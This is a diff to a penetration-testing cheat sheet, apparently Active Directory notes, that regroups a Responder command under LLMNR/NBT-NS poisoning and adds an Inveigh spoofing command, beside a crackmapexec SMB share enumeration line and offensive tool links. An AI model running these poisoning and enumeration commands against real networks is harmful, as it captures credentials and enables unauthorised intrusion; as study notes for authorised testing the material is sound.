@@ -60,7 +60,9 @@ or
 crackmapexec smb -u '<USER>' -p '<PWD>' -d '<DOMAIN>' <Target_IP> --shares
 ```
 
-## Responder
+## LLMNR/NBT-NS Poisoning
+
+### Responder
 
 ```bash
 sudo responder -I ens224
@@ -68,8 +70,15 @@ sudo responder -I ens224
 
 Logs are located at `/usr/share/responder/logs/` folder.
 
+### Inveigh
+
+```powershell
+C:\Tools\Inveigh.exe -nbns y -mDNS y
+```
+
 ## Links
 
 - [bloodhound-python](https://github.com/fox-it/BloodHound.py)
 - [crackmapexec cheatsheet](https://lisandre.com/archives/14589)
 - [OSCP-Cheatsheets](https://github.com/blackc03r/OSCP-Cheatsheets)
+- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
